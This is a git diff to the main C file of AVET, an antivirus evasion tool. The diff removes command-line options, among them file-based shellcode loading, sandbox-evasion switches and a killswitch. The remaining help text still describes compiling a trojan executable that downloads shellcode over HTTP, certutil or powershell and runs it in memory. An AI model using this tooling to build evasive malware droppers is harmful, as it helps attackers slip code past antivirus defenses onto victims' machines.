@@ -13,26 +13,16 @@ Web: https://github.com/govolution/avet
  
 void print_start();
 void print_help();
-int print_debug;
-int load_from_file;
 
 int main (int argc, char **argv)
 {
 	print_start();
-
-	print_debug = 0;
-	load_from_file = 0;
+	
 	char *evalue = NULL;
-	char *fvalue = NULL;
-	char *kvalue = NULL;
 	char *uvalue = NULL;
 	char *wvalue = NULL;
-	int hflag = 0;
-	int Fflag = 0;
-	int Xflag = 0;
-	int Eflag = 0;
-	int Aflag = 0;
-	int qflag = 0;
+	int hflag = 0;	
+	int Eflag = 0;	
 	char *dvalue = NULL;
 
 	int index;
@@ -41,7 +31,7 @@ int main (int argc, char **argv)
 	opterr = 0;
 
 	// compute the options
-	while ((c = getopt (argc, argv, "e:f:k:u:d:w:lphFXEAq")) != -1)
+	while ((c = getopt (argc, argv, "e:u:d:w:hE")) != -1)
 		switch (c)
 		{
 			case 'd':
@@ -49,16 +39,7 @@ int main (int argc, char **argv)
 				break;
 			case 'e':
 				evalue = optarg;
-				break;
-			case 'l':
-				load_from_file = 1;
-				break;
-			case 'f':
-				fvalue = optarg;
-				break;
-			case 'k':
-				kvalue = optarg;
-				break;
+				break;			
 			case 'u':
 				uvalue = optarg;
 				break;
@@ -67,29 +48,12 @@ int main (int argc, char **argv)
 				break;
 			case 'h':
 				hflag = 1;
-				break;
-			case 'F':
-				Fflag = 1;
-				break;
-			case 'X':
-				Xflag = 1;
-				break;
+				break;				
 			case 'E':
 				Eflag = 1;
-				break;
-			case 'A':
-				Aflag = 1;
-				break;
-			case 'q':
-				qflag = 1;
-				break;
-			case 'p':
-				print_debug = 1;
-				break;
+				break;				
 			case '?':
 				if (optopt == 'e')
-					fprintf (stderr, "Option -%c requires an argument.\n", optopt);
-				else if (optopt == 'f')
 					fprintf (stderr, "Option -%c requires an argument.\n", optopt);
 				else if (optopt == 'k')
 					fprintf (stderr, "Option -%c requires an argument.\n", optopt);
@@ -108,64 +72,8 @@ int main (int argc, char **argv)
 
 	// print help
 	if (hflag)
-		print_help();
-	else if (load_from_file)
-	{
-		//write LVALUE to defs.h
-		FILE *file_def;
-		file_def = fopen ("defs.h","w");
-
-		if (file_def == NULL)
-		{
-			printf ("Error open defs.h\n");
-			return -1;
-		}
-
-		fprintf (file_def, "#define LVALUE\n");
-		fclose(file_def);
-	}
+		print_help();	
 	
-	// write shellcode from a given file to defs.h
-	else if (fvalue)
-	{
-		printf ("write shellcode from %s to defs.h\n", fvalue);
-
-		FILE *file_def;
-		file_def = fopen ("defs.h","w");
-
-		if (file_def == NULL)
-		{
-			printf ("Error open defs.h\n");
-			return -1;
-		}
-
-		fseek (file_def, 0, SEEK_END);
-
-		// read the shellcode file, write to defs.h
-		FILE *file_sh = fopen ( fvalue, "r" );
-
-		if ( file_sh != NULL )
-		{
-			if(Eflag)
-				fprintf (file_def, "#define FVALUE \"");
-			else
-				fprintf (file_def, "#define FVALUE \"\"\n");
-
-			char line [ 5000 ];
-
-			while ( fgets ( line, sizeof line, file_sh ) != NULL )
-				fprintf (file_def, "%s", line);           
-
-			if(Eflag)
-				fprintf (file_def, "\"\n");
-			//fprintf (file_def, "\\n");
-			fclose ( file_sh );
-		}
-		else
-			printf ("Error open %s\n", fvalue);
-
-		fclose (file_def);
-	}
 	// exec from url
 	else if (uvalue)
 	{
@@ -193,30 +101,11 @@ int main (int argc, char **argv)
 	{
 		printf ("Error open defs.h\n");
 		return -1;
-	}
-
-	//write LVALUE to defs.h
-	if(print_debug)
-		fprintf (file_def, "#define PRINT_DEBUG\n");
-
-	//write SANDBOX_FOPEN to defs.h
-	if(Fflag)
-		fprintf (file_def, "#define SANDBOX_FOPEN\n");
-
-	//write X64 to defs.h
-	if(Xflag)
-		fprintf (file_def, "#define X64\n");
+	}	
 	
 	//write ENCRYPT to defs.h
 	if(Eflag)
-		fprintf (file_def, "#define ENCRYPT\n");
-
-	//write ASCIIMSF to defs.h
-	if(Aflag)
-		fprintf (file_def, "#define ASCIIMSF\n");
-
-	if(qflag)
-		fprintf (file_def, "#define QUIET\n");
+		fprintf (file_def, "#define ENCRYPT\n");	
 
 	if(dvalue)
 	{
@@ -228,34 +117,14 @@ int main (int argc, char **argv)
 			fprintf (file_def, "#define DOWNLOADPOWERSHELL\n");
 	}
 	
-	fclose(file_def);
-
-	//the killswitch
-	if (kvalue)
-	{
-		//write KVALUE to defs.h
-		FILE *file_def;
-		file_def = fopen ("defs.h","a");
-
-		if (file_def == NULL)
-		{
-			printf ("Error open defs.h\n");
-			return -1;
-		}
-
-		fseek (file_def, 0, SEEK_END);
-		fprintf (file_def, "#define KVALUE \"%s\"\n", kvalue);
-		fclose(file_def);
-	}
+	fclose(file_def);	
 
 } //main
 
 void print_help()
 {
-	printf("Options:\n");
-	printf("-l load and exec shellcode from given file, call is with mytrojan.exe myshellcode.bin\n");
+	printf("Options:\n");	
 	printf("   when called with -E call with mytrojan.exe shellcode.txt\n");
-	printf("-f compile shellcode into .exe, needs filename of shellcode file\n");
 	printf("-u load and exec shellcode from url using internet explorer (url is compiled into executable)\n");
 	printf("-d download the shellcode file using different techniques\n");
 	printf("   -d sock -> for downloading a raw shellcode via http in memory and exec (no overhead, use socket)\n");
@@ -265,14 +134,7 @@ void print_help()
 	printf("      usage of -d certutil/powershell in combination with -f\n");
 	printf("      for executing the raw shellcode after downloading\n");
 	printf("      call: pwn thepayload.bin http://server/thepayload.bin\n");
-	printf("-E use avets ASCII encryption, often do not has to be used\n");
-	printf("   Can be used with -l\n");
-	//printf("-A use metasploits ASCII encryption, usage is like -E\n");
-	printf("-F use fopen sandbox evasion\n");
-	printf("-k \"killswitch\" sandbox evasion with gethostbyname\n");
-	printf("-X compile for 64 bit\n");
-	printf("-p print debug information\n");
-	printf("-q quiet mode (hide console window)\n");
+	printf("-E use avets ASCII encryption, often do not has to be used\n");		
 	printf("-h help\n\n");
 	printf("Please refer README.md for more information\n");
 }
